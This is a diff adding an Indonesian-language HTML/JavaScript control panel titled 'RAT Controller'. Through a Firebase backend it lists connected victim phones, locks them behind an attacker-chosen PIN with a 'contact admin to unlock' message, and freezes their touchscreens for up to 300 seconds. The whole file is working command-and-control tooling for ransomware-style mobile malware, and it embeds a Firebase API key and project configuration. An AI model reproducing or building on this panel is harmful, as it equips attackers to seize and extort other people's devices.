@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Controller - Lock/Unlock/TouchBlock</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body {
+            background: #0a0a0a;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+            padding: 15px;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: #111;
+            border: 2px solid #00ff41;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 0 50px rgba(0,255,65,0.15);
+        }
+        .header {
+            text-align: center;
+            border-bottom: 1px solid #00ff41;
+            padding-bottom: 12px;
+            margin-bottom: 15px;
+        }
+        .header h1 { font-size: 20px; text-shadow: 0 0 15px #00ff41; letter-spacing: 2px; }
+        .status-badge {
+            display: inline-block;
+            background: #00ff41;
+            color: #000;
+            padding: 3px 12px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+        .target-list {
+            background: #1a1a1a;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+            max-height: 120px;
+            overflow-y: auto;
+        }
+        .target-item {
+            padding: 8px 12px;
+            margin: 4px 0;
+            background: #000;
+            border-radius: 5px;
+            border-left: 3px solid #00ff41;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+        }
+        .target-item.active { border-left-color: #ffaa00; background: #1a1a00; }
+        .target-item .name { font-size: 13px; }
+        .target-item .id { font-size: 10px; color: #666; }
+        .target-item .status { font-size: 10px; }
+        .target-item .locked { color: #ff0044; }
+        .target-item .unlocked { color: #00ff41; }
+        .target-item .touchblock { color: #ffaa00; }
+        
+        .section {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 12px 0;
+            border: 1px solid #333;
+        }
+        .section-title {
+            font-size: 13px;
+            color: #00ff41;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 8px;
+        }
+        .section-title .icon { margin-right: 8px; }
+        
+        .pin-dots {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 12px 0;
+        }
+        .pin-dot {
+            width: 40px;
+            height: 50px;
+            background: #000;
+            border: 2px solid #00ff41;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 22px;
+            color: #00ff41;
+            font-weight: bold;
+            line-height: 45px;
+        }
+        .pin-dot input {
+            width: 100%;
+            height: 100%;
+            background: transparent;
+            border: none;
+            color: #00ff41;
+            font-size: 22px;
+            text-align: center;
+            font-weight: bold;
+        }
+        .pin-dot input:focus { outline: none; }
+        
+        .message-area textarea {
+            width: 100%;
+            padding: 10px;
+            background: #000;
+            border: 1px solid #333;
+            color: #00ff41;
+            border-radius: 8px;
+            font-size: 13px;
+            resize: vertical;
+            min-height: 50px;
+        }
+        
+        .touch-duration {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin: 10px 0;
+        }
+        .touch-duration label {
+            color: #666;
+            font-size: 12px;
+            min-width: 60px;
+        }
+        .touch-duration input {
+            flex: 1;
+            padding: 10px;
+            background: #000;
+            border: 1px solid #333;
+            color: #00ff41;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+        }
+        .touch-duration input:focus { border-color: #00ff41; outline: none; }
+        .touch-duration span {
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 12px;
+            flex-wrap: wrap;
+        }
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            min-width: 80px;
+        }
+        .btn-lock { background: #00ff41; color: #000; }
+        .btn-lock:hover { background: #00cc33; transform: scale(1.02); }
+        .btn-unlock { background: #ff0044; color: #fff; }
+        .btn-unlock:hover { background: #cc0033; transform: scale(1.02); }
+        .btn-touch { background: #ffaa00; color: #000; }
+        .btn-touch:hover { background: #dd8800; transform: scale(1.02); }
+        .btn:disabled { opacity: 0.3; cursor: not-allowed; transform: none; }
+        
+        .log {
+            margin-top: 12px;
+            padding: 10px;
+            background: #000;
+            border-radius: 8px;
+            max-height: 80px;
+            overflow-y: auto;
+            font-size: 11px;
+            border: 1px solid #222;
+        }
+        .log .success { color: #00ff41; }
+        .log .error { color: #ff0044; }
+        .log .info { color: #ffaa00; }
+        .log .action { color: #00ccff; }
+        .log .touch { color: #ffaa00; }
+        
+        .info-box {
+            background: #1a1a1a;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-size: 12px;
+            border-left: 3px solid #00ff41;
+        }
+        .info-box span { color: #666; }
+        
+        @media (max-width: 480px) {
+            .container { padding: 12px; }
+            .pin-dot { width: 32px; height: 42px; font-size: 18px; line-height: 38px; }
+            .btn { padding: 12px; font-size: 11px; min-width: 60px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="app">
+        <div class="header">
+            <h1>⚡ RAT CONTROLLER</h1>
+            <div class="status-badge" id="statusBadge">● ONLINE</div>
+        </div>
+
+        <div class="target-list" id="targetList">
+            <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
+                Menunggu target terhubung...
+            </div>
+        </div>
+
+        <div class="info-box">
+            <span>Target:</span> <span id="deviceName">-</span><br>
+            <span>Status:</span> <span id="deviceStatus">-</span>
+        </div>
+
+        <!-- SECTION 1: LOCK DEVICE -->
+        <div class="section">
+            <div class="section-title"><span class="icon">🔒</span> LOCK DEVICE</div>
+            <div class="pin-dots">
+                <div class="pin-dot"><input type="text" maxlength="1" id="pin1" value="1"></div>
+                <div class="pin-dot"><input type="text" maxlength="1" id="pin2" value="2"></div>
+                <div class="pin-dot"><input type="text" maxlength="1" id="pin3" value="3"></div>
+                <div class="pin-dot"><input type="text" maxlength="1" id="pin4" value="4"></div>
+            </div>
+            <div class="message-area">
+                <label style="color:#666; font-size:11px;">Pesan Lock</label>
+                <textarea id="lockMessage">⚠️ DEVICE LOCKED\nHubungi admin untuk unlock</textarea>
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-lock" id="lockBtn" disabled>🔒 LOCK</button>
+                <button class="btn btn-unlock" id="unlockBtn" disabled>🔓 UNLOCK</button>
+            </div>
+        </div>
+
+        <!-- SECTION 2: TOUCH BLOCK -->
+        <div class="section" style="border-color:#ffaa00;">
+            <div class="section-title" style="color:#ffaa00;"><span class="icon">✋</span> TOUCH BLOCK (FREEZE HP)</div>
+            <div class="touch-duration">
+                <label>Durasi (detik)</label>
+                <input type="number" id="touchDuration" value="10" min="1" max="300">
+                <span>detik</span>
+            </div>
+            <div style="color:#666; font-size:11px; margin:5px 0 10px 0;">
+                ⚡ HP korban akan FREEZE (tidak bisa disentuh) selama durasi yang ditentukan
+            </div>
+            <div class="btn-group">
+                <button class="btn btn-touch" id="touchBlockBtn" disabled>✋ FREEZE HP</button>
+            </div>
+        </div>
+
+        <div class="log" id="logArea">
+            <div class="info">[SYSTEM] Menunggu koneksi Firebase...</div>
+        </div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <script>
+        // ============================================================
+        // 🔥 DATA FIREBASE ANDA (GANTI DENGAN PUNYA SENDIRI)
+        // ============================================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
+            authDomain: "rat-controller-5b29c.firebaseapp.com",
+            databaseURL: "https://rat-controller-5b29c-default-rtdb.azurewebsites.net",
+            projectId: "rat-controller-5b29c",
+            storageBucket: "storage.googleapis.com",
+            messagingSenderId: "928595828959",
+            appId: "1:928595828959:web:e4715e3095f7456d5896a",
+            measurementId: "G-821ZZ77TPS"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        let selectedTarget = null;
+        let targets = {};
+
+        const targetList = document.getElementById('targetList');
+        const deviceName = document.getElementById('deviceName');
+        const deviceStatus = document.getElementById('deviceStatus');
+        const lockBtn = document.getElementById('lockBtn');
+        const unlockBtn = document.getElementById('unlockBtn');
+        const touchBlockBtn = document.getElementById('touchBlockBtn');
+        const logArea = document.getElementById('logArea');
+
+        function getPin() {
+            return document.getElementById('pin1').value +
+                   document.getElementById('pin2').value +
+                   document.getElementById('pin3').value +
+                   document.getElementById('pin4').value;
+        }
+
+        function getMessage() {
+            return document.getElementById('lockMessage').value;
+        }
+
+        function getTouchDuration() {
+            return parseInt(document.getElementById('touchDuration').value) || 10;
+        }
+
+        function addLog(text, type = 'info') {
+            const div = document.createElement('div');
+            div.className = type;
+            div.textContent = `[${new Date().toLocaleTimeString()}] ${text}`;
+            logArea.appendChild(div);
+            logArea.scrollTop = logArea.scrollHeight;
+            if (logArea.children.length > 25) {
+                logArea.removeChild(logArea.firstChild);
+            }
+        }
+
+        // ============ LISTEN TARGETS ============
+        db.ref('targets').on('value', (snapshot) => {
+            const data = snapshot.val();
+            targets = data || {};
+            renderTargetList();
+            
+            if (!selectedTarget && Object.keys(targets).length > 0) {
+                const firstId = Object.keys(targets)[0];
+                selectTarget(firstId);
+            }
+            
+            if (selectedTarget && targets[selectedTarget]) {
+                updateInfo(selectedTarget);
+            }
+        });
+
+        function renderTargetList() {
+            const keys = Object.keys(targets);
+            if (keys.length === 0) {
+                targetList.innerHTML = `
+                    <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
+                        ⚠️ Tidak ada target terhubung
+                    </div>
+                `;
+                return;
+            }
+
+            targetList.innerHTML = '';
+            keys.forEach(id => {
+                const t = targets[id];
+                const div = document.createElement('div');
+                let statusText = '🔓 UNLOCKED';
+                let statusClass = 'unlocked';
+                if (t.touchBlocked) {
+                    statusText = '✋ FREEZE';
+                    statusClass = 'touchblock';
+                } else if (t.locked) {
+                    statusText = '🔒 LOCKED';
+                    statusClass = 'locked';
+                }
+                div.className = `target-item ${selectedTarget === id ? 'active' : ''}`;
+                div.innerHTML = `
+                    <div>
+                        <div class="name">${t.deviceName || 'Unknown'}</div>
+                        <div class="id">${id.slice(0,8)}</div>
+                    </div>
+                    <div style="text-align:right;">
+                        <div class="status ${statusClass}">${statusText}</div>
+                        <div style="font-size:9px; color:#666;">${t.online ? '🟢 Online' : '🔴 Offline'}</div>
+                    </div>
+                `;
+                div.onclick = () => selectTarget(id);
+                targetList.appendChild(div);
+            });
+        }
+
+        function selectTarget(id) {
+            selectedTarget = id;
+            renderTargetList();
+            updateInfo(id);
+            
+            if (targets[id]) {
+                lockBtn.disabled = false;
+                unlockBtn.disabled = false;
+                touchBlockBtn.disabled = false;
+                addLog(`Target selected: ${targets[id].deviceName || id.slice(0,8)}`, 'action');
+            }
+        }
+
+        function updateInfo(id) {
+            const t = targets[id];
+            if (!t) {
+                deviceName.textContent = '-';
+                deviceStatus.textContent = '-';
+                lockBtn.disabled = true;
+                unlockBtn.disabled = true;
+                touchBlockBtn.disabled = true;
+                return;
+            }
+            deviceName.textContent = t.deviceName || 'Unknown';
+            let status = '🔓 UNLOCKED';
+            if (t.touchBlocked) {
+                status = '✋ FREEZE';
+            } else if (t.locked) {
+                status = '🔒 LOCKED';
+            }
+            deviceStatus.textContent = status;
+            lockBtn.disabled = false;
+            unlockBtn.disabled = false;
+            touchBlockBtn.disabled = false;
+        }
+
+        // ============ LOCK DEVICE ============
+        document.getElementById('lockBtn').onclick = function() {
+            if (!selectedTarget || !targets[selectedTarget]) {
+                addLog('Pilih target terlebih dahulu!', 'error');
+                return;
+            }
+
+            const pin = getPin();
+            const message = getMessage();
+
+            if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+                addLog('PIN harus 4 digit angka!', 'error');
+                return;
+            }
+
+            const ref = db.ref(`targets/${selectedTarget}`);
+            ref.update({
+                locked: true,
+                pin: pin,
+                message: message,
+                lockTime: Date.now(),
+                touchBlocked: false
+            }).then(() => {
+                addLog(`🔒 DEVICE LOCKED: ${selectedTarget.slice(0,8)} | PIN: ${pin}`, 'success');
+            }).catch(err => {
+                addLog(`Gagal lock: ${err.message}`, 'error');
+            });
+        };
+
+        // ============ UNLOCK DEVICE ============
+        document.getElementById('unlockBtn').onclick = function() {
+            if (!selectedTarget || !targets[selectedTarget]) {
+                addLog('Pilih target terlebih dahulu!', 'error');
+                return;
+            }
+
+            const ref = db.ref(`targets/${selectedTarget}`);
+            ref.update({
+                locked: false,
+                pin: null,
+                message: null,
+                touchBlocked: false
+            }).then(() => {
+                addLog(`🔓 DEVICE UNLOCKED: ${selectedTarget.slice(0,8)}`, 'success');
+            }).catch(err => {
+                addLog(`Gagal unlock: ${err.message}`, 'error');
+            });
+        };
+
+        // ============ TOUCH BLOCK (FREEZE) ============
+        document.getElementById('touchBlockBtn').onclick = function() {
+            if (!selectedTarget || !targets[selectedTarget]) {
+                addLog('Pilih target terlebih dahulu!', 'error');
+                return;
+            }
+
+            const duration = getTouchDuration();
+            if (duration < 1 || duration > 300) {
+                addLog('Durasi harus 1-300 detik!', 'error');
+                return;
+            }
+
+            const ref = db.ref(`targets/${selectedTarget}`);
+            ref.update({
+                touchBlocked: true,
+                touchDuration: duration,
+                touchBlockTime: Date.now(),
+                locked: false,
+                pin: null,
+                message: null
+            }).then(() => {
+                addLog(`✋ HP FREEZE: ${selectedTarget.slice(0,8)} | Durasi: ${duration} detik`, 'touch');
+                // Auto-unfreeze setelah durasi selesai
+                setTimeout(() => {
+                    ref.update({
+                        touchBlocked: false,
+                        touchDuration: null,
+                        touchBlockTime: null
+                    }).then(() => {
+                        addLog(`✅ HP UNFREEZE: ${selectedTarget.slice(0,8)} (otomatis)`, 'success');
+                    }).catch(() => {});
+                }, duration * 1000);
+            }).catch(err => {
+                addLog(`Gagal freeze: ${err.message}`, 'error');
+            });
+        };
+
+        addLog('Firebase connected, menunggu target...', 'info');
+    </script>
+</body>
+</html>
